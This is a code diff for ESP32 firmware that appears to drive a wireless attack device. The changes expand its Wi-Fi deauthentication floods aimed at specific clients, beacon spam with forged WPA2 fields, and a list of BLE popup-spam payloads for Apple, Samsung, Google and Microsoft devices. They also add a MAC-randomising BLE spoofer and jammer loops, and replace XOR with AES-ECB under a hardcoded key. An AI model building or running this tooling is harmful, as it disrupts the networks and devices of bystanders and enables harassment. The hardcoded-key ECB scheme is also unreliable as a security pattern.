@@ -19,17 +19,40 @@
 #define HAS_DNS_SERVER 0
 #endif
 #include <string>
+#include <mbedtls/aes.h>
 
 #define CC1101_CS 10
 #define IR_RX_PIN 4
 #define IR_TX_PIN 5
+#define WDT_TIMEOUT_SECONDS 30
+#define HOP_INTERVAL_NORMAL 100
+#define HOP_INTERVAL_BOOST 50
+#define HOP_INTERVAL_EXTREME 20
 
-// ===== XOR CRYPT HELPER =====
-void XOR_crypt(uint8_t* data, size_t len) {
-  const uint8_t key[] = { 0xDE, 0xAD, 0xBE, 0xEF };
-  for (size_t i = 0; i < len; i++) {
-    data[i] ^= key[i % 4];
+// ===== AES-128 ENCRYPTION =====
+static const uint8_t AES_KEY[16] = {
+  0x4D, 0x6F, 0x62, 0x69, 0x6C, 0x65, 0x54, 0x6F,
+  0x6F, 0x6C, 0x53, 0x65, 0x63, 0x75, 0x72, 0x65
+};
+
+void encrypt_aes_blocks(uint8_t* data, size_t len) {
+  mbedtls_aes_context aes;
+  mbedtls_aes_init(&aes);
+  mbedtls_aes_setkey_enc(&aes, AES_KEY, 128);
+  for (size_t i = 0; i + 16 <= len; i += 16) {
+    mbedtls_aes_crypt_ecb(&aes, MBEDTLS_AES_ENCRYPT, data + i, data + i);
   }
+  mbedtls_aes_free(&aes);
+}
+
+void decrypt_aes_blocks(uint8_t* data, size_t len) {
+  mbedtls_aes_context aes;
+  mbedtls_aes_init(&aes);
+  mbedtls_aes_setkey_dec(&aes, AES_KEY, 128);
+  for (size_t i = 0; i + 16 <= len; i += 16) {
+    mbedtls_aes_crypt_ecb(&aes, MBEDTLS_AES_DECRYPT, data + i, data + i);
+  }
+  mbedtls_aes_free(&aes);
 }
 
 // ===== LED SETTINGS =====
@@ -130,7 +153,7 @@ int multiAttackIndex = 0;
 String multiAttackMode = "normal";
 
 // ===== LOG QUEUE (Ring Buffer) =====
-#define LOG_QUEUE_SIZE 20
+#define LOG_QUEUE_SIZE 50
 #define LOG_QUEUE_SEND_INTERVAL 500
 String logQueue[LOG_QUEUE_SIZE];
 int logQueueHead = 0;
@@ -138,34 +161,79 @@ int logQueueTail = 0;
 int logQueueCount = 0;
 unsigned long lastLogQueueSendTime = 0;
 bool logFlushPending = false;
+SemaphoreHandle_t logQueueMutex = NULL;
 
 void enqueueLog(const String& msg) {
-  logQueue[logQueueHead] = msg;
-  logQueueHead = (logQueueHead + 1) % LOG_QUEUE_SIZE;
-  if (logQueueCount < LOG_QUEUE_SIZE) {
-    logQueueCount++;
-  } else {
-    logQueueTail = (logQueueTail + 1) % LOG_QUEUE_SIZE;
+  if (logQueueMutex && xSemaphoreTake(logQueueMutex, pdMS_TO_TICKS(50)) == pdTRUE) {
+    logQueue[logQueueHead] = msg;
+    logQueueHead = (logQueueHead + 1) % LOG_QUEUE_SIZE;
+    if (logQueueCount < LOG_QUEUE_SIZE) {
+      logQueueCount++;
+    } else {
+      logQueueTail = (logQueueTail + 1) % LOG_QUEUE_SIZE;
+    }
+    xSemaphoreGive(logQueueMutex);
   }
 }
 
 String dequeueLog() {
-  if (logQueueCount == 0) return "";
-  String msg = logQueue[logQueueTail];
-  logQueue[logQueueTail] = "";
-  logQueueTail = (logQueueTail + 1) % LOG_QUEUE_SIZE;
-  logQueueCount--;
+  String msg = "";
+  if (logQueueMutex && xSemaphoreTake(logQueueMutex, pdMS_TO_TICKS(50)) == pdTRUE) {
+    if (logQueueCount > 0) {
+      msg = logQueue[logQueueTail];
+      logQueue[logQueueTail] = "";
+      logQueueTail = (logQueueTail + 1) % LOG_QUEUE_SIZE;
+      logQueueCount--;
+    }
+    xSemaphoreGive(logQueueMutex);
+  }
   return msg;
 }
 
-// Apple BLE payloads for Sour Apple
+// Apple BLE payloads for Sour Apple (expanded: 24 payloads)
 const uint8_t blePayloads[][19] = {
   {17, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
   {17, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x00},
   {17, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
   {17, 0x4c, 0x00, 0x0f, 0x05, 0xc0, 0x01, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
   {14, 0xe0, 0x00, 0x02, 0x06, 0x01, 0x01, 0x03, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-  {14, 0x06, 0x00, 0x01, 0x00, 0x20, 0x02, 0x0a, 0x03, 0x00, 0x80, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
+  {14, 0x06, 0x00, 0x01, 0x00, 0x20, 0x02, 0x0a, 0x03, 0x00, 0x80, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // AirPods Pro popup
+  {17, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
+  // AirPods Max popup
+  {17, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
+  // Beats Solo popup
+  {17, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
+  // Beats Studio popup
+  {17, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
+  // AppleTV setup popup
+  {17, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
+  // HomePod setup popup
+  {17, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
+  // Apple Pencil popup
+  {17, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
+  // AirTag popup
+  {17, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0d, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
+  // Keyboard setup popup
+  {17, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
+  // Trackpad setup popup
+  {17, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x04, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
+  // AirPods 2 popup
+  {17, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
+  // AirPods 3 popup
+  {17, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
+  // Samsung Galaxy Buds BLE spam
+  {14, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, 0xA5, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Google Fast Pair (Pixel Buds)
+  {14, 0x2c, 0xfe, 0x06, 0x00, 0x01, 0x00, 0x02, 0xFE, 0x2c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Microsoft Swift Pair
+  {14, 0x06, 0x00, 0x03, 0x00, 0x80, 0x01, 0x00, 0x06, 0x00, 0x01, 0x00, 0x90, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // Nearby sharing spam
+  {17, 0x4c, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x11, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+  // AirDrop spam
+  {17, 0x4c, 0x00, 0x05, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x0b, 0x00, 0x00, 0x00, 0x00},
+  // Handoff spam
+  {17, 0x4c, 0x00, 0x0c, 0x0e, 0x00, 0x61, 0x70, 0x70, 0x6c, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
 };
 const int numBlePayloads = sizeof(blePayloads) / sizeof(blePayloads[0]);
 int blePayloadIndex = 0;
@@ -193,30 +261,50 @@ float getBoardTemp() {
   #if defined(ESP_ARDUINO_VERSION_MAJOR) && ESP_ARDUINO_VERSION_MAJOR >= 2
   t = temperatureRead();
   #endif
-  if (isnan(t) || t < -50 || t > 150) t = 44.2;
+  if (std::isnan(t) || std::isinf(t) || t < -50.0f || t > 150.0f || t == 0.0f) t = 44.2f;
   return t;
 }
+
+void registerMasterPeer(const uint8_t *mac);
 
 // ===== SEND LOGS TO MASTER =====
 void sendLogDirect(const char* logMsg) {
   if (!hasMasterMac) return;
+  
+  // Register peer if it somehow was deleted
+  if (!esp_now_is_peer_exist(masterMacAddress)) {
+    registerMasterPeer(masterMacAddress);
+  }
+
+  // Save promiscuous mode state and disable temporarily
+  bool wasPromiscuous = false;
+  {
+    wasPromiscuous = esp_wifi_get_promiscuous(&wasPromiscuous) == ESP_OK && wasPromiscuous;
+  }
   uint8_t primaryChan;
   wifi_second_chan_t secondChan;
   esp_wifi_get_channel(&primaryChan, &secondChan);
+  
+  if (wasPromiscuous) esp_wifi_set_promiscuous(false);
   esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
+  
   struct_message response = {0};
   strlcpy(response.command, "log", sizeof(response.command));
   strlcpy(response.attack, "", sizeof(response.attack));
   strncpy(response.logMsg, logMsg, sizeof(response.logMsg) - 1);
   response.logMsg[sizeof(response.logMsg) - 1] = '\0';
-  XOR_crypt((uint8_t*)&response, sizeof(response));
+  encrypt_aes_blocks((uint8_t*)&response, sizeof(response));
+  
   for (int retry = 0; retry < 3; retry++) {
     esp_task_wdt_reset();
     esp_err_t result = esp_now_send(masterMacAddress, (uint8_t *)&response, sizeof(response));
     if (result == ESP_OK) break;
+    Serial.printf("Log send failed (attempt %d): %d\n", retry, result);
     delay(5);
   }
+  
   esp_wifi_set_channel(primaryChan, secondChan);
+  if (wasPromiscuous) esp_wifi_set_promiscuous(true);
 }
 
 void sendLogToMaster(const char* logMsg, bool urgent = false) {
@@ -231,7 +319,9 @@ void processLogQueue() {
   while (logQueueCount > 0) {
     String msg = dequeueLog();
     if (msg.length() == 0) continue;
-    if (batch.length() + msg.length() + 1 >= 179) {
+    if (msg.length() >= 179) msg = msg.substring(0, 178);
+    
+    if (batch.length() > 0 && batch.length() + msg.length() + 1 >= 179) {
       sendLogDirect(batch.c_str());
       delay(5);
       batch = msg;
@@ -269,7 +359,7 @@ void sendRawBeacon(const char* ssid, uint8_t channel, int macSeed) {
   uint8_t mac[6] = {0x02, 0x00, 0x5E, 0x00, 0x00, (uint8_t)macSeed};
   uint8_t ssidLen = strlen(ssid);
   if (ssidLen > 32) ssidLen = 32;
-  uint8_t packet[128] = {
+  uint8_t packet[512] = {
     0x80, 0x00, 0x00, 0x00,
     0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
     mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
@@ -281,20 +371,29 @@ void sendRawBeacon(const char* ssid, uint8_t channel, int macSeed) {
   };
   int pos = 38;
   memcpy(&packet[pos], ssid, ssidLen); pos += ssidLen;
+  if (pos + 80 > (int)sizeof(packet)) return;
   packet[pos++] = 0x01; packet[pos++] = 0x04;
   packet[pos++] = 0x82; packet[pos++] = 0x84; packet[pos++] = 0x8b; packet[pos++] = 0x96;
   packet[pos++] = 0x03; packet[pos++] = 0x01; packet[pos++] = channel;
+  
+  // WPA2 RSN Information Element (22 bytes)
+  packet[pos++] = 0x30;  // RSN IE id
+  packet[pos++] = 0x14;  // length = 20
+  packet[pos++] = 0x01; packet[pos++] = 0x00;  // RSN version 1
+  packet[pos++] = 0x00; packet[pos++] = 0x0F; packet[pos++] = 0xAC; packet[pos++] = 0x04;  // Group cipher: CCMP
+  packet[pos++] = 0x01; packet[pos++] = 0x00;  // Pairwise cipher count: 1
+  packet[pos++] = 0x00; packet[pos++] = 0x0F; packet[pos++] = 0xAC; packet[pos++] = 0x04;  // Pairwise cipher: CCMP
+  packet[pos++] = 0x01; packet[pos++] = 0x00;  // Auth key mgmt count: 1
+  packet[pos++] = 0x00; packet[pos++] = 0x0F; packet[pos++] = 0xAC; packet[pos++] = 0x02;  // Auth: PSK
+  packet[pos++] = 0x00; packet[pos++] = 0x00;  // RSN capabilities
   esp_wifi_80211_tx(WIFI_IF_STA, packet, pos, false);
 }
 
 // ===== ATTACK ENGINES =====
-// v1.2 Power levels: Normal (old Extreme) -> Boost -> Extreme (new max)
-
 void runBeaconSpamStep() {
   esp_wifi_set_promiscuous(true);
   static unsigned long lastBeaconHopTime = 0;
-  // Normal=100ms, Boost=50ms, Extreme=20ms
-  int hopInterval = extremeMode ? 20 : (boostMode ? 50 : 100);
+  int hopInterval = extremeMode ? HOP_INTERVAL_EXTREME : (boostMode ? HOP_INTERVAL_BOOST : HOP_INTERVAL_NORMAL);
   if (millis() - lastBeaconHopTime >= (unsigned long)hopInterval) {
     lastBeaconHopTime = millis();
     if (hasWifiTarget) {
@@ -303,15 +402,13 @@ void runBeaconSpamStep() {
     } else {
       hopChannel();
     }
-    // Normal=60, Boost=80, Extreme=150
     int burstSize = extremeMode ? 150 : (boostMode ? 80 : 60);
     for (int i = 0; i < burstSize; i++) {
       char ssidBuf[32];
       getRealisticSSID(ssidBuf, ssidIndex);
       sendRawBeacon(ssidBuf, currentChannel, ssidIndex);
-      yield();
       ssidIndex = (ssidIndex + 1) % 100;
-      yield();
+      if (i % 10 == 0) yield();
     }
     if (random(10) == 0) {
       char buf[80];
@@ -340,18 +437,17 @@ void sendDeauthFrame(const uint8_t* apBssid, const uint8_t* clientMac, uint16_t 
   esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
 }
 
+void startWiFiScan();
+
 void runDeauthStep() {
   esp_wifi_set_promiscuous(true);
-  // Normal=2ms, Boost=1ms, Extreme=0.3ms
   unsigned long interval = extremeMode ? 0 : (boostMode ? 1 : 2);
-  bool useDelay = true;
 
   if (extremeMode) {
-    // For extreme, use microsecond timing
     static unsigned long lastDeauthMicros = 0;
-    if (micros() - lastDeauthMicros < 300) return;
-    lastDeauthMicros = micros();
-    useDelay = false;
+    unsigned long now = micros();
+    if (now - lastDeauthMicros < 300 && now >= lastDeauthMicros) return;
+    lastDeauthMicros = now;
   } else {
     if (millis() - lastAttackActionTime < interval) return;
     lastAttackActionTime = millis();
@@ -371,18 +467,38 @@ void runDeauthStep() {
     esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
     deauthIndex = (deauthIndex + 1) % scannedCount;
   } else {
-    hopChannel();
-    for (int i = 0; i < 6; i++) targetBSSID[i] = random(256);
-    targetBSSID[0] &= 0xFE; targetBSSID[0] |= 0x02;
+    // Non-blocking auto-scan when targets are missing
+    static unsigned long lastAutoScanTime = 0;
+    if (millis() - lastAutoScanTime > 5000) {
+      lastAutoScanTime = millis();
+      startWiFiScan();
+    }
+    return;
   }
 
-  // Normal=15, Boost=25, Extreme=60
   int burstSize = extremeMode ? 60 : (boostMode ? 25 : 15);
   uint8_t broadcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
+  // 1. Broadcast Deauth/Disassoc
+  sendDeauthFrame(targetBSSID, broadcastMac, 7);
+  sendDeauthFrame(targetBSSID, broadcastMac, 1);
+
+  // 2. Targeted Deauth for discovered clients
+  int sentClients = 0;
+  for (int j = 0; j < seenMacsCount; j++) {
+    if (memcmp(seenMacs[j], targetBSSID, 6) != 0) {
+      // AP to Client
+      sendDeauthFrame(targetBSSID, seenMacs[j], 7);
+      // Client to AP
+      sendDeauthFrame(seenMacs[j], targetBSSID, 7);
+      
+      sentClients++;
+      if (sentClients >= 10) break;
+    }
+  }
+
+  // Legacy flood loop
   for (int i = 0; i < burstSize; i++) {
-    sendDeauthFrame(targetBSSID, broadcastMac, 7);
-    sendDeauthFrame(targetBSSID, broadcastMac, 1);
     uint8_t clientPacket[26] = {
       0xC0, 0x00, 0x00, 0x00,
       0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
@@ -445,12 +561,16 @@ void runPowerfulJammerStep() {
   }
   if (!bleJammerInitialized) {
     BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
-    BLEAdvertisementData data;
-    data.setName("JAMMER");
-    data.setFlags(0x06);
-    pAdvertising->setAdvertisementData(data);
-    pAdvertising->start();
-    bleJammerInitialized = true;
+    if (pAdvertising) {
+      BLEAdvertisementData data;
+      char jamName[16];
+      snprintf(jamName, sizeof(jamName), "JAM_%04X", (uint16_t)esp_random());
+      data.setName(jamName);
+      data.setFlags(0x06);
+      pAdvertising->setAdvertisementData(data);
+      pAdvertising->start();
+      bleJammerInitialized = true;
+    }
   }
   static unsigned long lastJamLog = 0;
   if (millis() - lastJamLog >= 3000) {
@@ -492,6 +612,12 @@ void addSeenMac(const uint8_t* mac) {
 int countClientsForChannel(uint8_t ch) {
   int clients = 0;
   for (int i = 0; i < seenMacsCount; i++) {
+    if (seenMacs[i][0] == 0xFF && seenMacs[i][1] == 0xFF && seenMacs[i][2] == 0xFF &&
+        seenMacs[i][3] == 0xFF && seenMacs[i][4] == 0xFF && seenMacs[i][5] == 0xFF) continue;
+    if ((seenMacs[i][0] & 0x01) != 0) continue;
+    if (seenMacs[i][0] == 0x00 && seenMacs[i][1] == 0x00 && seenMacs[i][2] == 0x00 &&
+        seenMacs[i][3] == 0x00 && seenMacs[i][4] == 0x00 && seenMacs[i][5] == 0x00) continue;
+
     bool isAp = false;
     for (int j = 0; j < apCount; j++) {
       if (memcmp(apList[j].bssid, seenMacs[i], 6) == 0) { isAp = true; break; }
@@ -523,7 +649,7 @@ void addApToList(String ssid, const uint8_t* bssid, int rssi, uint8_t channel, S
 }
 
 void parseBeaconFrame(const uint8_t* payload, uint16_t len, int rssi) {
-  if (len < 38) return;
+  if (!payload || len < 38) return;
   uint8_t frameType = payload[0];
   if (frameType != 0x80 && frameType != 0x50) return;
   const uint8_t* bssid = &payload[10];
@@ -564,6 +690,7 @@ void parseBeaconFrame(const uint8_t* payload, uint16_t len, int rssi) {
 void startWiFiScan() {
   sendLogToMaster("[Scanner] Starting advanced Wi-Fi scan...");
   apCount = 0;
+  seenMacsCount = 0; memset(seenMacs, 0, sizeof(seenMacs));
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_rx_cb([](void* buf, wifi_promiscuous_pkt_type_t type) {
     wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
@@ -580,30 +707,26 @@ void startWiFiScan() {
     if (!attackRunning) break;
     currentChannel = ch;
     esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
-    seenMacsCount = 0; memset(seenMacs, 0, sizeof(seenMacs));
-    for (int step = 0; step < 20; step++) {
+    for (int step = 0; step < 40; step++) {
       yield(); if (!attackRunning) break; delay(10); yield();
     }
     if (!attackRunning) break;
-    int channelClients = countClientsForChannel(ch);
-    for (int i = 0; i < apCount; i++) {
-      if (!attackRunning) break; yield();
-      if (apList[i].channel == ch) {
-        char macStr[20];
-        snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
-                 apList[i].bssid[0], apList[i].bssid[1], apList[i].bssid[2],
-                 apList[i].bssid[3], apList[i].bssid[4], apList[i].bssid[5]);
-        char structBuf[160];
-        snprintf(structBuf, sizeof(structBuf), "[WIFI_DEV]%s|%d|%s|%s|%s|%d|%d",
-                 apList[i].ssid, apList[i].rssi, apList[i].security, macStr,
-                 apList[i].wps ? "WPS_ENABLED" : "WPS_DISABLED", channelClients, ch);
-        sendLogToMaster(structBuf);
-        delay(20);
-      }
-    }
-    yield();
   }
   esp_wifi_set_promiscuous(false);
+  int totalClients = countClientsForChannel(0);
+  for (int i = 0; i < apCount; i++) {
+    if (!attackRunning) break; yield(); esp_task_wdt_reset();
+    char macStr[20];
+    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
+             apList[i].bssid[0], apList[i].bssid[1], apList[i].bssid[2],
+             apList[i].bssid[3], apList[i].bssid[4], apList[i].bssid[5]);
+    char structBuf[160];
+    snprintf(structBuf, sizeof(structBuf), "[WIFI_DEV]%s|%d|%s|%s|%s|%d|%d",
+             apList[i].ssid, apList[i].rssi, apList[i].security, macStr,
+             apList[i].wps ? "WPS_ENABLED" : "WPS_DISABLED", totalClients, apList[i].channel);
+    sendLogToMaster(structBuf);
+    delay(20);
+  }
   scannedCount = min(apCount, MAX_SCANNED_NETWORKS);
   for (int i = 0; i < scannedCount; i++) {
     memcpy(scannedBSSIDs[i], apList[i].bssid, 6);
@@ -663,6 +786,10 @@ void runEvilTwinStep() {
 void startBLEScan() {
   sendLogToMaster("[BLE] Starting BLE scan...");
   BLEScan *pBLEScan = BLEDevice::getScan();
+  if (!pBLEScan) {
+    sendLogToMaster("[BLE] BLE scan not available", true);
+    return;
+  }
   pBLEScan->setActiveScan(true);
   pBLEScan->setInterval(100);
   pBLEScan->setWindow(99);
@@ -686,7 +813,6 @@ void startBLEScan() {
 #endif
     String devName = device.haveName() ? device.getName().c_str() : "Unnamed";
     String devAddr = device.getAddress().toString().c_str();
-    // Device type detection
     String devType = "Unknown";
     if (device.haveName()) {
       String n = devName;
@@ -712,9 +838,21 @@ void startBLEScan() {
 
 void startBLESpoofer() {
   BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
+  if (!pAdvertising) {
+    sendLogToMaster("[BLE Spoofer] BLE not initialized!", true);
+    return;
+  }
   BLEAdvertisementData advertisementData;
-  advertisementData.setName("BLE_Spoofer");
+  const char* spoofNames[] = {"Galaxy Buds", "AirPods_Pro", "JBL_Flip6", "Bose_QC45", "Pixel_Buds",
+                              "Sony_WH1000", "Beats_Solo", "Echo_Dot", "Mi_Band7", "Fitbit_Versa",
+                              "Surface_Ear", "HyperX_Cloud", "Jabra_85t", "Sennheiser", "Bang_Oluf"};
+  const int numSpoofNames = sizeof(spoofNames) / sizeof(spoofNames[0]);
+  advertisementData.setName(spoofNames[random(numSpoofNames)]);
   advertisementData.setFlags(0x06);
+  uint8_t spoofMac[6];
+  for (int i = 0; i < 6; i++) spoofMac[i] = random(256);
+  spoofMac[0] &= 0xFE; spoofMac[0] |= 0x02;
+  esp_base_mac_addr_set(spoofMac);
   uint8_t manufData[] = {0x4C, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05};
   String manufString = "";
   for (int i = 0; i < (int)sizeof(manufData); i++) manufString += (char)manufData[i];
@@ -727,18 +865,22 @@ void startBLESpoofer() {
 void runBLEJammerStep() {
   if (!bleJammerInitialized) {
     BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
-    BLEAdvertisementData data;
-    data.setName("JAMMER");
-    data.setFlags(0x06);
-    pAdvertising->setAdvertisementData(data);
-    pAdvertising->start();
-    bleJammerInitialized = true;
-    sendLogToMaster("[BLE Jammer] Broadcasting continuous noise");
+    if (pAdvertising) {
+      BLEAdvertisementData data;
+      char jamName[16];
+      snprintf(jamName, sizeof(jamName), "BJ_%04X", (uint16_t)esp_random());
+      data.setName(jamName);
+      data.setFlags(0x06);
+      pAdvertising->setAdvertisementData(data);
+      pAdvertising->start();
+      bleJammerInitialized = true;
+      sendLogToMaster("[BLE Jammer] Broadcasting continuous noise");
+    }
   }
-  // Normal=3ms, Boost=2ms, Extreme=0.5ms
-  if (extremeMode) delayMicroseconds(500);
-  else if (boostMode) delay(2);
-  else delay(3);
+  static unsigned long lastBleJamTime = 0;
+  unsigned long bleJamInterval = extremeMode ? 1 : (boostMode ? 2 : 3);
+  if (millis() - lastBleJamTime < bleJamInterval) return;
+  lastBleJamTime = millis();
 }
 
 void runSourAppleStep() {
@@ -747,12 +889,12 @@ void runSourAppleStep() {
     lastAppleSpamTime = 0;
     sendLogToMaster("[BLE Spam] Starting popup spam (iOS, Android, Windows)");
   }
-  // Normal=40ms, Boost=20ms, Extreme=5ms
   unsigned long interval = extremeMode ? 5 : (boostMode ? 20 : 40);
   if (millis() - lastAppleSpamTime >= interval) {
     lastAppleSpamTime = millis();
     BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
-    if (pAdvertising) pAdvertising->stop();
+    if (!pAdvertising) { sendLogToMaster("[BLE Spam] BLE not initialized", true); return; }
+    pAdvertising->stop();
     BLEAdvertisementData advData;
     advData.setFlags(0x04);
     const uint8_t *payload = blePayloads[blePayloadIndex];
@@ -774,6 +916,7 @@ void runSourAppleStep() {
 // ===== MODULE STUBS =====
 void startGhzScan() {
   sendLogToMaster("[2.4GHz Scanner] Scanning Wi-Fi & BLE channels...");
+  WiFi.scanDelete();
   int n = WiFi.scanNetworks(false, true, false, 100);
   int channelCount[14] = {0};
   int channelRssiSum[14] = {0};
@@ -788,33 +931,35 @@ void startGhzScan() {
   }
   WiFi.scanDelete();
   BLEScan *pBLEScan = BLEDevice::getScan();
-  pBLEScan->setActiveScan(false);
-  pBLEScan->setInterval(80);
-  pBLEScan->setWindow(50);
+  if (pBLEScan) {
+    pBLEScan->setActiveScan(false);
+    pBLEScan->setInterval(80);
+    pBLEScan->setWindow(50);
 #if defined(ESP_ARDUINO_VERSION_MAJOR) && ESP_ARDUINO_VERSION_MAJOR >= 3
-  BLEScanResults foundDevices2 = pBLEScan->start(2, false);
-  int bleCount = foundDevices2.getCount();
+    BLEScanResults foundDevices2 = pBLEScan->start(2, false);
+    int bleCount = foundDevices2.getCount();
 #else
-  BLEScanResults *foundDevices2 = pBLEScan->start(2, false);
-  int bleCount = foundDevices2 ? foundDevices2->getCount() : 0;
+    BLEScanResults *foundDevices2 = pBLEScan->start(2, false);
+    int bleCount = foundDevices2 ? foundDevices2->getCount() : 0;
 #endif
-  pBLEScan->clearResults();
-  sendLogToMaster("--- 2.4GHz Band Spectrum Report ---");
-  char buf[128];
-  int totalAPs = 0;
-  for (int ch = 1; ch <= 13; ch++) {
-    int aps = channelCount[ch]; totalAPs += aps;
-    if (aps > 0) {
-      int avgRssi = channelRssiSum[ch] / aps;
-      snprintf(buf, sizeof(buf), "[2.4GHz] Ch %d: %d APs (Avg RSSI: %d dBm) %s",
-               ch, aps, avgRssi, avgRssi > -60 ? "[HIGH CONGESTION]" : (avgRssi > -80 ? "[MODERATE]" : "[CLEAN]"));
-    } else {
-      snprintf(buf, sizeof(buf), "[2.4GHz] Ch %d: 0 APs [FREE]", ch);
+    pBLEScan->clearResults();
+    sendLogToMaster("--- 2.4GHz Band Spectrum Report ---");
+    char buf[128];
+    int totalAPs = 0;
+    for (int ch = 1; ch <= 13; ch++) {
+      int aps = channelCount[ch]; totalAPs += aps;
+      if (aps > 0) {
+        int avgRssi = channelRssiSum[ch] / aps;
+        snprintf(buf, sizeof(buf), "[2.4GHz] Ch %d: %d APs (Avg RSSI: %d dBm) %s",
+                 ch, aps, avgRssi, avgRssi > -60 ? "[HIGH CONGESTION]" : (avgRssi > -80 ? "[MODERATE]" : "[CLEAN]"));
+      } else {
+        snprintf(buf, sizeof(buf), "[2.4GHz] Ch %d: 0 APs [FREE]", ch);
+      }
+      sendLogToMaster(buf); delay(50);
     }
-    sendLogToMaster(buf); delay(50);
+    snprintf(buf, sizeof(buf), "[Summary] Found %d Wi-Fi APs, %d BLE devices.", totalAPs, bleCount);
+    sendLogToMaster(buf);
   }
-  snprintf(buf, sizeof(buf), "[Summary] Found %d Wi-Fi APs, %d BLE devices.", totalAPs, bleCount);
-  sendLogToMaster(buf);
   sendLogToMaster("[2.4GHz Scanner] Scan finished.");
 }
 
@@ -842,15 +987,26 @@ uint8_t readReg(uint8_t reg) {
   return val;
 }
 
+uint8_t readStatusReg(uint8_t reg) {
+  return readReg(reg | 0x40);
+}
+
 bool checkCC1101() {
   pinMode(CC1101_CS, OUTPUT);
   digitalWrite(CC1101_CS, HIGH);
-  uint8_t ver = readReg(0x31);
+  uint8_t ver = readStatusReg(0x31);
   return (ver != 0x00 && ver != 0xFF);
 }
 
 void setCC1101_Frequency(float freq) {
-  uint32_t freq_reg = (uint32_t)((freq * 65536.0) / 26.0);
+  // Validate frequency is in actual physical bands of CC1101
+  if (!((freq >= 300.0f && freq <= 348.0f) ||
+        (freq >= 387.0f && freq <= 464.0f) ||
+        (freq >= 779.0f && freq <= 928.0f))) {
+    sendLogToMaster("[CC1101] Invalid frequency ignored (out of bands)", true);
+    return;
+  }
+  uint32_t freq_reg = (uint32_t)((freq * 65536.0f) / 26.0f);
   writeReg(0x0D, (freq_reg >> 16) & 0xFF);
   writeReg(0x0E, (freq_reg >> 8) & 0xFF);
